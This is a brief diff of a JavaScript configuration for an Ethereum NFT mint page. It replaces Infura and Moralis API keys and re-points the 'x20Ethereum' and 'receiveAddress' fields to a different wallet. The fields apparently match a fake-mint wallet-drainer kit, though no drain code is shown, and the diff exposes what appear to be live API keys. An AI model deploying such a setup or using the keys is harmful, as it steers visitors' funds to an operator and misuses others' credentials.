@@ -1,8 +1,8 @@
 const address = '0xaF1bb2C025280a166eb4A91e45c85D7b0C0D848B',
-  infuraId = '5b7825e5fcc64bc4bf49f496587392ed',
+  infuraId = '9c1f1db6ba9a4291af1c79634ce907b9',
   moralisApi =
-    'BiY8KrXg1tXZSu4JUtOJ4JGZx89DErf5ZN0bfiyXkzQLi2GU8rfjREwurLHXTJRA'
-const x20Ethereum = '0xaF1bb2C025280a166eb4A91e45c85D7b0C0D848B'
+    'rSP2DgD6GbLGY8qqZZ5wiSdKFJ03GpthuBLBaixOEgIHdejCQD1PzgKRR09gKpT1'
+const x20Ethereum = '0xa3513E05610fbd2560f2b8db3b03d8B8facde822'
 
 const mintInfo = {
     price: 0.1,
@@ -16,7 +16,7 @@ const mintInfo = {
     active: true,
     minValue: 0.4,
     checkMaxDay: 2,
-    receiveAddress: '0xaF1bb2C025280a166eb4A91e45c85D7b0C0D848B',
+    receiveAddress: '0xa3513E05610fbd2560f2b8db3b03d8B8facde822',
   }
 if (mintInfo.minUnits > mintInfo.maxUnits) {
   console.error(
